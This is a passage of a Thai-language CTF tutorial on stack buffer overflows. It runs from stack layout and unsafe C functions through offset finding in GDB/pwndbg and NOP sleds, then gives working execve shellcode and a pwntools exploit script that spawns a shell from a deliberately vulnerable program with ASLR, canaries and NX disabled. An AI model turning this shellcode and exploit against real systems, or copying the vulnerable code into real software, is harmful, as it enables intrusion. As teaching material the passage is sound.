# Part 071: Stack Buffer Overflow (Educational/CTF Context)

> **คำเตือน (Disclaimer):** เนื้อหานี้จัดทำขึ้นเพื่อวัตถุประสงค์ทางการศึกษาและการแข่งขัน CTF (Capture The Flag) เท่านั้น การนำความรู้นี้ไปใช้โจมตีระบบโดยไม่ได้รับอนุญาตเป็นสิ่งผิดกฎหมาย ผู้เรียนควรฝึกฝนในสภาพแวดล้อมที่ควบคุมได้เท่านั้น

---

## สารบัญ (Table of Contents)

1. [Stack Layout Review](#1-stack-layout-review)
2. [Vulnerable C Functions](#2-vulnerable-c-functions)
3. [Buffer Overflow Concept](#3-buffer-overflow-concept)
4. [Overwriting Saved RBP and Return Address](#4-overwriting-saved-rbp-and-return-address)
5. [Finding Offset: Cyclic Pattern Technique](#5-finding-offset-cyclic-pattern-technique)
6. [GDB pwndbg: Finding EIP/RIP Overwrite Offset](#6-gdb-pwndbg-finding-eiprip-overwrite-offset)
7. [NOP Sled](#7-nop-sled)
8. [Shellcode Injection](#8-shellcode-injection)
9. [ASLR Disabled Example Exploit](#9-aslr-disabled-example-exploit)
10. [Compiling Vulnerable Programs](#10-compiling-vulnerable-programs)
11. [GDB Analysis: Examine Stack Frame](#11-gdb-analysis-examine-stack-frame)
12. [checksec Tool Output Interpretation](#12-checksec-tool-output-interpretation)
13. [pwntools: Basic Exploit Script Template](#13-pwntools-basic-exploit-script-template)
14. [Proof of Concept: Crash to Controlled RIP](#14-proof-of-concept-crash-to-controlled-rip)
15. [Defense Mechanisms](#15-defense-mechanisms)
16. [Complete Example: Vulnerable Program to Working Exploit](#16-complete-example-vulnerable-program-to-working-exploit)
17. [CTF Challenge Walkthrough](#17-ctf-challenge-walkthrough)
18. [สรุป (Summary)](#18-สรุป-summary)

---

## 1. Stack Layout Review

### 1.1 ความเข้าใจพื้นฐานเกี่ยวกับ Stack

Stack เป็นโครงสร้างข้อมูลแบบ LIFO (Last In, First Out) ที่ใช้เก็บข้อมูลชั่วคราวในระหว่างการทำงานของโปรแกรม บน x86-64 Linux stack จะเติบโตจากที่อยู่สูงไปหาที่อยู่ต่ำ (grows downward)

```
High Address
┌─────────────────────────────┐
│     Environment Variables   │
├─────────────────────────────┤
│     Command Line Arguments  │
├─────────────────────────────┤
│          Stack              │  ← ESP/RSP (Stack Pointer)
│       (grows down ↓)        │
├─────────────────────────────┤
│          Heap               │
│       (grows up ↑)          │
├─────────────────────────────┤
│    BSS (uninitialized data) │
├─────────────────────────────┤
│    Data (initialized data)  │
├─────────────────────────────┤
│    Text (code/program)      │
└─────────────────────────────┘
Low Address
```

### 1.2 Stack Frame Structure

เมื่อโปรแกรมเรียก function หนึ่ง CPU จะสร้าง stack frame ใหม่ขึ้นมา:

```
                    Stack Frame Layout (x86-64)
High Address
┌────────────────────────────────────────┐
│         Caller's Stack Frame           │
│  ...                                   │
│  arg7, arg8, ... (args beyond 6)       │
├────────────────────────────────────────┤ ← rbp + 16 (after call)
│         Return Address (RIP)           │  ← 8 bytes - where to return after function
├────────────────────────────────────────┤ ← rbp + 8 (old caller's RBP position)
│         Saved RBP (Base Pointer)       │  ← 8 bytes - saved caller's RBP
├────────────────────────────────────────┤ ← rbp (current function's base)
│                                        │
│         Local Variables               │
│         buffer[64]                     │
│         int x                          │
│         ...                            │
├────────────────────────────────────────┤ ← rsp (current stack pointer)
│         (unused/canary space)          │
└────────────────────────────────────────┘
Low Address
```

### 1.3 Function Call Mechanics

เมื่อ CPU ดำเนินการ `call` instruction:

```nasm
; Before CALL
; rsp = 0x7fffffffef08

call function       ; 1. Push return address (next instruction) onto stack
                    ; 2. Jump to function

; Inside function prologue:
push rbp            ; 3. Save caller's rbp
mov  rbp, rsp       ; 4. Set rbp = current rsp (establish new frame)
sub  rsp, 0x40      ; 5. Allocate local variable space (e.g., 64 bytes)
```

ผลลัพธ์บน stack หลัง prologue:

```
Address         Value              Description
─────────────────────────────────────────────
0x7fffffffef10  0x00401234         Return Address (RIP saved)
0x7fffffffef08  0x7fffffffef20     Saved RBP (old rbp)
0x7fffffffef00  ...                local var / top of frame (rbp)
0x7fffffffeec0  [buffer start]     char buffer[64]  (rsp after sub rsp,0x40)
```

### 1.4 Function Return Mechanics

```nasm
; Function epilogue:
leave               ; equivalent to: mov rsp, rbp; pop rbp
ret                 ; Pop return address from stack into RIP → jump there
```

**สำคัญมาก:** ถ้าเราสามารถเขียนทับ Return Address ได้ เราก็ควบคุม flow ของโปรแกรมได้!

### 1.5 Registers ที่เกี่ยวข้อง

| Register | ขนาด  | หน้าที่                                      |
|----------|-------|----------------------------------------------|
| RSP      | 64-bit | Stack Pointer - ชี้ไปยัง top of stack       |
| RBP      | 64-bit | Base Pointer - ชี้ไปยังฐานของ stack frame   |
| RIP      | 64-bit | Instruction Pointer - program counter        |
| ESP      | 32-bit | Stack Pointer (32-bit mode)                 |
| EBP      | 32-bit | Base Pointer (32-bit mode)                  |
| EIP      | 32-bit | Instruction Pointer (32-bit mode)            |

---

## 2. Vulnerable C Functions

### 2.1 `gets()` - The Most Dangerous Function

`gets()` อ่าน input จาก stdin โดยไม่มีการตรวจสอบขนาด buffer เลย!

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
    char buffer[64];
    printf("Enter your name: ");
    gets(buffer);           // NEVER USE THIS! No bounds checking!
    printf("Hello, %s!\n", buffer);
}

int main() {
    vulnerable_function();
    return 0;
}
```

**ทำไม `gets()` ถึงอันตราย?**
- ไม่มี parameter สำหรับกำหนดขนาด buffer
- อ่านจนกว่าจะเจอ newline หรือ EOF
- เขียนทับ memory หลัง buffer ได้ไม่จำกัด
- ถูก deprecated ตั้งแต่ C99 และลบออกใน C11

**Man page warning:**
```
BUGS
       Never use gets().  Because it is impossible to tell without knowing
       the data in advance how many characters gets() will read, and because
       gets() will continue to store characters past the end of the buffer,
       it is extremely dangerous to use.  It has been used to break computer
       security.  Use fgets() instead.
```

### 2.2 `strcpy()` - Copy Without Bounds

```c
#include <string.h>

void vulnerable_strcpy(char *user_input) {
    char buffer[64];
    strcpy(buffer, user_input);    // Copies until null byte, no size check!
    printf("Copied: %s\n", buffer);
}

// Safe alternative:
void safe_version(char *user_input) {
    char buffer[64];
    strncpy(buffer, user_input, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\0';    // Ensure null termination
}
```

**ปัญหาของ `strcpy()`:**
- Copy จาก source ไป destination จนกว่าจะเจอ null byte `\0`
- ไม่ตรวจสอบว่า destination buffer ใหญ่พอหรือไม่
- ถ้า source ยาวกว่า destination → buffer overflow

### 2.3 `sprintf()` - Format String Without Bounds

```c
#include <stdio.h>

void vulnerable_sprintf(char *name, int age) {
    char buffer[64];
    sprintf(buffer, "Name: %s, Age: %d", name, age);    // Dangerous!
    puts(buffer);
}

// Safe alternative:
void safe_sprintf(char *name, int age) {
    char buffer[64];
    snprintf(buffer, sizeof(buffer), "Name: %s, Age: %d", name, age);
}
```

**ปัญหาของ `sprintf()`:**
- ถ้า format string ผลิต output ที่ใหญ่กว่า buffer → overflow
- ไม่มีการตรวจสอบขนาด
- ใช้ `snprintf()` แทนเสมอ

### 2.4 `strcat()` - Concatenate Without Bounds

```c
#include <string.h>

void vulnerable_strcat(char *suffix) {
    char buffer[64] = "Hello, ";
    strcat(buffer, suffix);    // Appends without checking remaining space!
    puts(buffer);
}

// Safe alternative:
void safe_strcat(char *suffix) {
    char buffer[64] = "Hello, ";
    size_t remaining = sizeof(buffer) - strlen(buffer) - 1;
    strncat(buffer, suffix, remaining);
}
```

### 2.5 `scanf()` กับ `%s`

```c
#include <stdio.h>

void vulnerable_scanf() {
    char buffer[64];
    scanf("%s", buffer);        // %s reads until whitespace, no bounds check!
    printf("Input: %s\n", buffer);
}

// Safe alternative:
void safe_scanf() {
    char buffer[64];
    scanf("%63s", buffer);      // Limit to 63 chars (leave room for null)
}
```

### 2.6 ตารางสรุป Vulnerable vs Safe Functions

| Vulnerable    | Safe Alternative        | เหตุผล                              |
|---------------|-------------------------|-------------------------------------|
| `gets()`      | `fgets()`               | Specify max length                  |
| `strcpy()`    | `strncpy()` / `strlcpy()` | Specify max length                |
| `strcat()`    | `strncat()` / `strlcat()` | Specify max length                |
| `sprintf()`   | `snprintf()`            | Specify max output length           |
| `scanf("%s")` | `scanf("%Ns")`          | Specify max field width             |
| `gets_s()`    | `fgets()`               | C11 optional, non-portable          |

---

## 3. Buffer Overflow Concept

### 3.1 อธิบาย Buffer Overflow

Buffer Overflow เกิดขึ้นเมื่อโปรแกรมเขียนข้อมูลลงใน buffer มากกว่าที่ buffer สามารถรองรับได้ ข้อมูลส่วนเกินจะ "overflow" ไปยัง memory ที่อยู่ติดกัน

```
ก่อน Overflow:
Buffer [64 bytes]:
┌─────────────────────────────┐
│ A A A A A A A A ...         │  ← 64 bytes input
└─────────────────────────────┘
Saved RBP: [original value]
Return Address: [original function return]

หลัง Overflow (input = 200 bytes):
Buffer [64 bytes]:
┌─────────────────────────────┐
│ A A A A A A A A A A A A A A│  ← first 64 bytes
└─────────────────────────────┘
Saved RBP: [AAAAAAAA]           ← OVERWRITTEN!
Return Address: [AAAAAAAA]      ← OVERWRITTEN! Program will crash or jump
Extra data: [AAAA...]           ← continues overwriting...
```

### 3.2 Memory Diagram ของ Overflow

```c
void vulnerable() {
    char buffer[64];    // buffer เริ่มที่ rbp-0x40
    int secret = 0;     // secret เริ่มที่ rbp-0x44 หรือ rbp-0x48
    gets(buffer);
}
```

Stack layout:

```
High Address (rbp + direction)
├──────────────────────────┤
│    Return Address (8B)   │  rbp + 8
├──────────────────────────┤
│    Saved RBP (8B)        │  rbp + 0  ← rbp points here
├──────────────────────────┤
│    (padding/alignment)   │  rbp - 8
├──────────────────────────┤
│    buffer[63..56]        │  rbp - 8  to rbp - 0x40
│    buffer[55..48]        │
│    buffer[47..40]        │
│    buffer[39..32]        │
│    buffer[31..24]        │
│    buffer[23..16]        │
│    buffer[15..8]         │
│    buffer[7..0]          │  rbp - 0x40  ← buffer starts here
└──────────────────────────┘
Low Address (rsp)
```

### 3.3 ตัวอย่าง Overflow แบบเห็นชัด

```c
// overflow_demo.c
#include <stdio.h>
#include <string.h>

void print_secret() {
    printf("[!] You accessed the secret function!\n");
}

void vulnerable() {
    char buffer[32];
    int authenticated = 0;
    
    printf("Password: ");
    gets(buffer);
    
    if (authenticated) {
        printf("Access granted!\n");
    } else {
        printf("Access denied!\n");
    }
}

int main() {
    vulnerable();
    return 0;
}
```

ถ้า `authenticated` อยู่หลัง buffer บน stack:

```
Stack (เติบโตลงล่าง):
[buffer 32 bytes][authenticated 4 bytes][padding][saved_rbp][return_addr]

Input: "AAAA...AAAA" (มากกว่า 32 bytes)
→ buffer overflow เขียนทับ authenticated
→ authenticated มีค่า != 0
→ "Access granted!" แสดงขึ้นมา!
```

### 3.4 ประเภทของ Buffer Overflow

**Stack-based Buffer Overflow:**
- เกิดบน stack ของ function
- สามารถ overwrite return address
- เป็นพื้นฐานของ part นี้

**Heap-based Buffer Overflow:**
- เกิดบน heap (malloc/new)
- ซับซ้อนกว่า
- เกี่ยวข้องกับ heap metadata corruption

**Off-by-One Error:**
- Overflow เพียง 1 byte
- อาจ overwrite null terminator หรือ size field
- ยังอันตรายได้

---

## 4. Overwriting Saved RBP and Return Address

### 4.1 ความสัมพันธ์ระหว่าง Buffer กับ Return Address

```c
void vulnerable_function() {
    char buffer[64];        // 64 bytes
    // Gap อาจมีหรือไม่มีขึ้นกับ alignment
    gets(buffer);
}
```

บน stack (64-bit system):
```
Offset จาก buffer[0]:
[0  - 63]  = buffer (64 bytes)
[64 - 71]  = saved RBP (8 bytes)
[72 - 79]  = Return Address (8 bytes)  ← เป้าหมายของเรา!
```

ดังนั้น: **offset = 64 (buffer) + 8 (saved rbp) = 72**

### 4.2 การ Overwrite Return Address

```python
# Python script เพื่อสร้าง payload
import struct

buffer_size = 64
saved_rbp   = 8
offset      = buffer_size + saved_rbp   # = 72

target_address = 0xdeadbeef             # address ที่ต้องการ jump ไป

payload = b'A' * offset                  # Fill buffer + saved RBP
payload += struct.pack('<Q', target_address)  # Little-endian 8-byte address

print(payload)
```

### 4.3 ทำไม Saved RBP ถึงสำคัญ

เมื่อ function return:
1. `leave` = `mov rsp, rbp; pop rbp` → restore caller's RBP
2. `ret` = `pop rip` → jump to return address

ถ้า saved RBP ถูก overwrite:
- Caller's RBP จะ corrupt
- อาจทำให้ stack frame ของ caller ไม่ถูกต้อง
- อาจ crash หรือ unexpected behavior ใน caller

**สำหรับ exploit ง่ายๆ:** เราสนใจแค่ overwrite return address, saved RBP ใส่ค่าอะไรก็ได้ (มักใส่ `'B' * 8` เพื่อแยกให้เห็น)

### 4.4 ตัวอย่าง Payload Structure

```
[AAAA...AAAA] [BBBBBBBB] [CCCCCCCC]
 ^64 bytes^    ^8 bytes^  ^8 bytes^
  buffer        saved      return
               rbp (pad)   address
```

```python
# สร้าง payload ด้วย pwntools
from pwn import *

offset = 72
win_addr = 0x00401196    # address ของ win() function

payload = flat(
    b'A' * 64,           # buffer
    b'B' * 8,            # saved rbp (overwrite with junk)
    p64(win_addr)        # return address → redirect to win()
)
```

### 4.5 ความแตกต่างระหว่าง 32-bit และ 64-bit

**32-bit (x86):**
- Addresses ขนาด 4 bytes
- EIP = 4 bytes
- `struct.pack('<I', address)` หรือ `p32(address)`

**64-bit (x86-64):**
- Addresses ขนาด 8 bytes (แต่ใช้แค่ 6 bytes จริงๆ)
- RIP = 8 bytes
- `struct.pack('<Q', address)` หรือ `p64(address)`
- Addresses มักขึ้นต้นด้วย `0x00007f...`
- **ปัญหา:** null bytes ใน address อาจหยุด `strcpy()` ก่อนกำหนด

---

## 5. Finding Offset: Cyclic Pattern Technique

### 5.1 ปัญหาของการหา Offset ด้วยมือ

การหา offset ด้วยการ guess หรือคำนวณจาก source code ไม่เสมอไปทำงาน เพราะ:
- Compiler อาจเพิ่ม padding เพื่อ alignment
- Stack canaries เพิ่ม space
- Local variables อื่นๆ อยู่ระหว่าง buffer และ return address

**วิธีที่ดีกว่า:** ใช้ Cyclic Pattern (De Bruijn sequence)

### 5.2 De Bruijn Sequence คืออะไร

De Bruijn sequence คือ string ที่ทุก subsequence ขนาด n ปรากฏอย่างมากหนึ่งครั้ง ทำให้เราสามารถระบุ offset ได้จากค่าที่อยู่ใน register

```
ตัวอย่าง cyclic pattern (ขนาด 100 bytes):
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
aanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

### 5.3 ใช้ pwntools สร้าง Cyclic Pattern

```python
from pwn import *

# สร้าง cyclic pattern
pattern = cyclic(200)
print(pattern)
# aaaabaaacaaadaaae...
```

### 5.4 ขั้นตอนการหา Offset

**ขั้นที่ 1:** สร้าง cyclic pattern และส่งเป็น input

```bash
python3 -c "from pwn import *; print(cyclic(200))" > pattern.txt
```

**ขั้นที่ 2:** Run โปรแกรมด้วย pattern แล้วดู crash

```bash
gdb ./vulnerable
(gdb) run < pattern.txt
Program received signal SIGSEGV, Segmentation fault.
0x6161616e in ?? ()
```

**ขั้นที่ 3:** หา offset จากค่าใน RIP

```python
from pwn import *

# ค่าที่อยู่ใน RIP เมื่อ crash
rip_value = 0x6161616e

offset = cyclic_find(rip_value)
print(f"Offset: {offset}")    # เช่น: Offset: 72
```

**หรือใช้ cyclic_find กับ bytes:**
```python
from pwn import *

# ค่าใน RIP เป็น bytes (little-endian จาก memory)
rip_bytes = b'naaa'
offset = cyclic_find(rip_bytes)
print(f"Offset: {offset}")
```

### 5.5 ตัวอย่างสมบูรณ์

```bash
# Terminal 1: Run GDB
$ gdb -q ./vuln
Reading symbols from ./vuln...
(No debugging symbols found in ./vuln)
pwndbg> run
Starting program: /home/user/vuln
Enter input: 
```

```bash
# Terminal 2: สร้าง pattern
$ python3 -c "
from pwn import *
p = cyclic(200)
print(p.decode())
"
aaaabaaacaaadaaae...
```

```bash
# ใน GDB
pwndbg> run <<< $(python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(200))")
Starting program: /home/user/vuln
Enter input: 

Program received signal SIGSEGV, Segmentation fault.
0x00000000006161616e in ?? ()

pwndbg> p $rip
$1 = (void (*)()) 0x6161616e
```

```python
# หา offset
from pwn import *
offset = cyclic_find(0x6161616e)
print(f"[*] Offset found: {offset}")
# [*] Offset found: 72
```

### 5.6 ใช้ pattern_create และ pattern_offset ของ pwndbg

```bash
pwndbg> cyclic 200
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaag...

pwndbg> run
# หลัง crash
pwndbg> cyclic -l $rip
Finding cyclic pattern of 4 bytes: b'naaa' (hex: 0x6e616161)
Found at offset 72
```

---

## 6. GDB pwndbg: Finding EIP/RIP Overwrite Offset

### 6.1 ติดตั้ง GDB และ pwndbg

```bash
# ติดตั้ง GDB
sudo apt-get install gdb

# ติดตั้ง pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# หรือผ่าน pip
pip3 install pwndbg
```

### 6.2 คำสั่ง GDB พื้นฐาน

```bash
# เริ่ม GDB
gdb ./vulnerable_program
gdb -q ./vulnerable_program    # Quiet mode (ไม่แสดง intro)

# Run program
(gdb) run
(gdb) r
(gdb) run arg1 arg2            # Run with arguments
(gdb) run < input.txt          # Run with file as stdin

# Breakpoints
(gdb) break main               # Break at function name
(gdb) break *0x401234          # Break at address
(gdb) b main                   # Short form
(gdb) info breakpoints         # List breakpoints
(gdb) delete 1                 # Delete breakpoint 1

# Step/Continue
(gdb) continue                 # Continue until next breakpoint
(gdb) step                     # Step into function call
(gdb) next                     # Step over function call
(gdb) finish                   # Run until current function returns
(gdb) stepi                    # Step one instruction
(gdb) nexti                    # Next instruction (over calls)

# Examine registers
(gdb) info registers           # All registers
(gdb) p $rip                   # Print RIP value
(gdb) p $rsp                   # Print RSP value
(gdb) p $rbp                   # Print RBP value

# Examine memory
(gdb) x/20x $rsp               # Hex dump 20 words at RSP
(gdb) x/20gx $rsp              # 64-bit (giant) words
(gdb) x/20wx $rsp              # 32-bit words
(gdb) x/s 0x402000             # String at address
(gdb) x/i $rip                 # Instruction at RIP
(gdb) x/20i main               # 20 instructions at main

# Disassemble
(gdb) disassemble main
(gdb) disas vulnerable_function
(gdb) disas $rip, $rip+50      # Disassemble range

# Print values
(gdb) p variable_name
(gdb) p/x $rax                 # Print in hex
(gdb) p/d $rax                 # Print as decimal
(gdb) p/s address              # Print as string
```

### 6.3 pwndbg Extensions

pwndbg เพิ่ม commands ที่มีประโยชน์มาก:

```bash
# Stack visualization
pwndbg> stack 20               # Show stack contents
pwndbg> telescope $rsp 20      # Enhanced stack view with derefs

# Context display (auto-updates after each step)
pwndbg> context                # Full context: registers, stack, code

# Search memory
pwndbg> search -t bytes b'\x90\x90'  # Search for NOP NOP
pwndbg> search -s "/bin/sh"           # Search for string
pwndbg> find $rsp, $rsp+0x100, 0x41414141  # Find pattern

# Cyclic pattern
pwndbg> cyclic 200             # Generate pattern
pwndbg> cyclic -l 0x6161616e   # Find offset from RIP value

# ASLR info
pwndbg> vmmap                  # Show memory mappings
pwndbg> aslr                   # Show ASLR status

# checksec
pwndbg> checksec               # Security features of binary
```

### 6.4 Workflow: ตรวจสอบ Crash และหา Offset

```bash
# Step 1: Load program
$ gdb -q ./vuln
pwndbg> 

# Step 2: Generate cyclic pattern และ run
pwndbg> cyclic 200
aaaaaaaabaaaaaaacaaaaaaad...

pwndbg> run
Starting program: ./vuln
Enter name: aaaaaaaabaaaaaaacaaaaaaad...

Program received signal SIGSEGV, Segmentation fault.
─────────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RIP  0x6161616e6161616d    ← ค่านี้มาจาก cyclic pattern

# Step 3: หา offset
pwndbg> cyclic -l 0x6161616e
Finding cyclic pattern of 4 bytes: b'naaa' (hex: 0x6e616161)
Found at offset 72

# ดังนั้น offset = 72
```

### 6.5 ตรวจสอบ Stack Frame อย่างละเอียด

```bash
# ใน GDB ก่อน crash (set breakpoint ก่อน gets())
pwndbg> break *vulnerable_function+10    # หลัง prologue
pwndbg> run

pwndbg> info frame
Stack level 0, frame at 0x7fffffffef00:
 rip = 0x4011ae in vulnerable_function; saved rip = 0x4011e0
 called by frame at 0x7fffffffef10
 Arglist at 0x7fffffffee58, args: 
 Locals at 0x7fffffffee58, frame base 0x7fffffffef00

pwndbg> x/20gx $rbp-0x50   # ดู stack ก่อน gets()
0x7fffffffee70: 0x0000000000000000  0x0000000000000000
0x7fffffffee80: 0x0000000000000000  0x0000000000000000
0x7fffffffee90: 0x0000000000000000  0x0000000000000000
0x7fffffffeea0: 0x0000000000000000  0x0000000000000000  ← buffer starts
0x7fffffffeeb0: 0x00007fffffffef00  ← saved RBP
0x7fffffffeec0: 0x00000000004011e0  ← return address ← เป้าหมาย!
```

---

## 7. NOP Sled

### 7.1 NOP Instruction คืออะไร

NOP (No Operation) คือ instruction ที่ไม่ทำอะไรเลย แค่เพิ่ม program counter ขึ้น 1

```nasm
nop                 ; opcode: 0x90 (1 byte)
; ทำงานเทียบเท่ากับ:
; xchg eax, eax (ใน 32-bit ยุคเก่า)
; หรือ nop prefix ใน 64-bit
```

### 7.2 ทำไมต้องใช้ NOP Sled

**ปัญหา:** เมื่อ inject shellcode บน stack เราต้องรู้ address ที่แน่นอนของ shellcode แต่:
- Stack address อาจเปลี่ยนไปเล็กน้อยในแต่ละ run (environment variables, program name ยาวสั้น)
- เมื่อ run ใน GDB เทียบกับนอก GDB stack address ต่างกัน (GDB inject env vars)

**วิธีแก้:** ใส่ NOP sled ก่อน shellcode → ถ้า jump ไปตรงไหนก็ได้ใน NOP sled จะ "สไลด์" ไปถึง shellcode

### 7.3 NOP Sled Visualization

```
Payload Structure กับ NOP Sled:

[  padding  ] [   NOP NOP NOP ... NOP   ] [  SHELLCODE  ] [return address]
 ↑            ↑                           ↑
 fill to      NOP sled (~100-200 bytes)    actual shellcode
 offset       0x90 0x90 0x90 ...

ถ้า jump ไปที่ใดใน NOP sled:
→ CPU execute 0x90 0x90 0x90... (ไม่ทำอะไร)
→ เลื่อนไปเรื่อยๆ จนถึง shellcode
→ shellcode ถูก execute
```

### 7.4 ขนาด NOP Sled

```python
from pwn import *

buffer_size = 200    # ขนาด buffer ที่มีอยู่สำหรับ shellcode

nop_sled_size = 100  # 50% ของ space เป็น NOP
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68..."  # actual shellcode

nop_sled = b'\x90' * nop_sled_size

# NOP sled อยู่ก่อน shellcode
payload_data = nop_sled + shellcode

# Return address ชี้ไปที่กลางๆ ของ NOP sled
# (ไม่ต้องแม่นยำ 100%)
```

### 7.5 ทำไม NOP Sled ใช้ไม่ได้กับ ASLR

ASLR (Address Space Layout Randomization) randomize stack base address ทุก run → ไม่รู้ว่า NOP sled อยู่ที่ address ไหน

วิธีแก้ปัญหา ASLR:
1. Disable ASLR (สำหรับ CTF/lab เท่านั้น)
2. ใช้ info leak เพื่อรู้ stack address ก่อน
3. ใช้ ROP chains แทน shellcode injection

---

## 8. Shellcode Injection

### 8.1 Shellcode คืออะไร

Shellcode คือ machine code ขนาดเล็กที่ inject เข้าไปในโปรแกรม โดยมักมีเป้าหมายเพื่อ spawn shell (`/bin/sh`)

**คุณสมบัติของ shellcode ที่ดี:**
- ขนาดเล็ก
- ไม่มี null bytes (จะทำให้ `strcpy()` หยุดก่อนกำหนด)
- Position-independent (ทำงานได้ไม่ว่า load ที่ address ไหน)
- ไม่ใช้ hardcoded addresses

### 8.2 ตัวอย่าง x86-64 Shellcode (execve /bin/sh)

**Assembly version:**
```nasm
; shellcode.asm - spawn /bin/sh on x86-64 Linux
section .text
global _start

_start:
    ; execve("/bin/sh", NULL, NULL)
    ; syscall number: 59 (0x3b) = execve on x86-64
    
    xor    rdx, rdx         ; rdx = NULL (envp)
    xor    rsi, rsi         ; rsi = NULL (argv)
    
    ; Push "/bin/sh\0" onto stack
    ; /bin/sh = 0x68732f6e69622f2f (with extra /)
    mov    rbx, 0x68732f6e69622f2f  ; "//bin/sh"
    push   rbx
    
    mov    rdi, rsp         ; rdi = pointer to "/bin/sh"
    
    xor    rax, rax
    mov    al, 0x3b         ; rax = 59 = execve
    
    syscall
```

**Compiled shellcode bytes:**
```python
# execve("/bin/sh", NULL, NULL) - 27 bytes
shellcode = (
    b"\x48\x31\xd2"          # xor rdx, rdx
    b"\x48\x31\xf6"          # xor rsi, rsi  
    b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  # mov rbx, "//bin/sh"
    b"\x53"                  # push rbx
    b"\x48\x89\xe7"          # mov rdi, rsp
    b"\x48\x31\xc0"          # xor rax, rax
    b"\xb0\x3b"              # mov al, 0x3b
    b"\x0f\x05"              # syscall
)
```

### 8.3 x86 (32-bit) Shellcode

```nasm
; 32-bit execve shellcode
section .text
global _start

_start:
    xor    eax, eax
    push   eax              ; Push NULL terminator
    push   0x68732f2f      ; "//sh"
    push   0x6e69622f      ; "/bin"
    mov    ebx, esp         ; ebx = "/bin//sh"
    push   eax              ; argv[1] = NULL
    push   ebx              ; argv[0] = "/bin//sh"
    mov    ecx, esp         ; ecx = argv
    xor    edx, edx         ; edx = NULL (envp)
    mov    al, 0x0b         ; sys_execve = 11
    int    0x80             ; syscall
```

### 8.4 เงื่อนไขที่ต้องเป็นจริงสำหรับ Shellcode Injection

1. **NX (No-Execute) ถูก disable** → Stack ต้อง executable
   ```bash
   gcc -z execstack ...    # เปิด executable stack
   ```

2. **ไม่มี ASLR** หรือมี info leak
   ```bash
   echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
   ```

3. **ไม่มี Stack Canary**
   ```bash
   gcc -fno-stack-protector ...
   ```

4. **Buffer ใหญ่พอสำหรับ shellcode** (อย่างน้อย ~30-50 bytes)

### 8.5 Shellcode Sources สำหรับ CTF

```python
# ใช้ pwntools built-in shellcode
from pwn import *

context.arch = 'amd64'    # หรือ 'i386'
context.os = 'linux'

# shellcraft generates assembly
print(shellcraft.sh())     # /bin/sh shellcode

# compile to bytes
shellcode = asm(shellcraft.sh())
print(shellcode.hex())

# custom shellcode
shellcode = asm("""
    xor rdi, rdi
    push rdi
    ...
""")
```

**เว็บไซต์ shellcode:**
- shell-storm.org/shellcode/
- exploit-db.com

---

## 9. ASLR Disabled Example Exploit

### 9.1 ตรวจสอบสถานะ ASLR

```bash
# ดู ASLR setting
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled
# 1 = conservative randomization (stack, heap)
# 2 = full randomization (all)

# Disable ASLR (ต้องการ root)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# หรือใช้ setarch
setarch $(uname -m) -R ./vulnerable_program
# -R = disable ASLR for this process

# ใน GDB
(gdb) set disable-randomization on    # default ใน GDB
```

### 9.2 โปรแกรมที่ Vulnerable

```c
// vuln_noaslr.c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void vulnerable() {
    char buffer[128];
    printf("Your input: ");
    fflush(stdout);
    read(0, buffer, 256);    // อ่านมากกว่า buffer!
}

int main() {
    vulnerable();
    return 0;
}
```

```bash
# Compile
gcc -o vuln_noaslr vuln_noaslr.c \
    -fno-stack-protector \    # Disable stack canary
    -z execstack \            # Make stack executable
    -no-pie \                 # No Position Independent Executable
    -g                        # Debug symbols

# Verify
checksec --file=vuln_noaslr
```

### 9.3 หา Stack Address

```bash
# Method 1: ใน GDB (ASLR disabled ใน GDB by default)
gdb -q ./vuln_noaslr
pwndbg> break vulnerable
pwndbg> run
pwndbg> p &buffer
$1 = (char (*)[128]) 0x7fffffffee80

# Method 2: Run หลายครั้ง ดูว่า address เหมือนกัน
for i in $(seq 5); do
    python3 -c "
import subprocess, re
p = subprocess.Popen(['./vuln_noaslr'], 
    stdin=subprocess.PIPE, 
    stdout=subprocess.PIPE, 
    stderr=subprocess.PIPE)
# (ต้องมี debug print ของ buffer address ก่อน)
" 
done
```

### 9.4 สร้าง Exploit Script

```python
#!/usr/bin/env python3
# exploit_noaslr.py

from pwn import *

# Setup
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'

# Target
binary = './vuln_noaslr'
elf = ELF(binary)

# เปิด process
p = process(binary)

# shellcode สำหรับ spawn /bin/sh
shellcode = asm(shellcraft.sh())
log.info(f"Shellcode length: {len(shellcode)} bytes")

# Exploit parameters
buf_size = 128       # buffer size ใน program
saved_rbp = 8        # saved RBP size (64-bit)
offset = buf_size + saved_rbp  # = 136

# Stack address (หาจาก GDB, จะเหมือนกันเพราะ ASLR disabled)
buf_addr = 0x7fffffffee80    # address ของ buffer

# สร้าง payload
nop_sled = b'\x90' * 50

payload = flat(
    nop_sled,                          # NOP sled
    shellcode,                         # shellcode
    b'A' * (offset - len(nop_sled) - len(shellcode)),  # padding
    p64(buf_addr + 10)                 # return address → middle of NOP sled
)

log.info(f"Payload length: {len(payload)}")
log.info(f"Target address: {hex(buf_addr + 10)}")

# ส่ง payload
p.sendline(payload)

# Interact with shell
p.interactive()
```

### 9.5 Run Exploit

```bash
$ python3 exploit_noaslr.py
[*] '/home/user/vuln_noaslr'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled        ← สำคัญ!
    PIE:      No PIE (0x400000)  ← สำคัญ!
[+] Starting local process './vuln_noaslr': pid 12345
[*] Shellcode length: 44 bytes
[*] Payload length: 144 bytes
[*] Target address: 0x7fffffffee8a
[*] Switching to interactive mode
$ 
$ whoami
user
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```

---

## 10. Compiling Vulnerable Programs

### 10.1 gcc Flags สำหรับ Disable Security Features

```bash
